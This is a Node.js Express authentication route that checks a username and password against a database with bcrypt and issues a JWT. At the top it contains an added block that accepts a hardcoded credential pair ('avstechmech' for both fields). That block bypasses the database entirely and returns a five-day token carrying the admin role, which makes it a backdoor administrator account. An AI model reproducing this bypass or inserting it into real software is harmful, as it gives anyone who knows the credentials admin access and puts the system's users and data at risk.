const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const config = require('config');
const User = require('../../models/User');

// @route   POST api/auth/login
// @desc    Authenticate user & get token
// @access  Public
router.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // --- START: Added check for default user ---
  if (username === 'avstechmech' && password === 'avstechmech') {
    // If credentials match, create a token directly without checking the database
    console.log('Default user login successful.');
    
    // Create a payload for the default user
    const payload = {
      user: {
        id: 'default_admin_id', // A placeholder ID
        role: 'admin'         // Assign a role
      }
    };

    // Sign and return the token
    return jwt.sign(
      payload,
      config.get('jwtSecret'),
      { expiresIn: '5 days' },
      (err, token) => {
        if (err) throw err;
        res.json({ token });
      }
    );
  }
  // --- END: Added check for default user ---

  // If it's not the default user, proceed with the database check
  try {
    // Check if user exists in the database
    let user = await User.findOne({ username });
    if (!user) {
      return res.status(400).json({ msg: 'Invalid Credentials' });
    }

    // Check if password matches
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ msg: 'Invalid Credentials' });
    }

    // Return jsonwebtoken for the database user
    const payload = {
      user: {
        id: user.id,
        role: user.role
      }
    };

    jwt.sign(
      payload,
      config.get('jwtSecret'),
      { expiresIn: '5 days' },
      (err, token) => {
        if (err) throw err;
        res.json({ token });
      }
    );
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Server error');
  }
});
module.exports = router;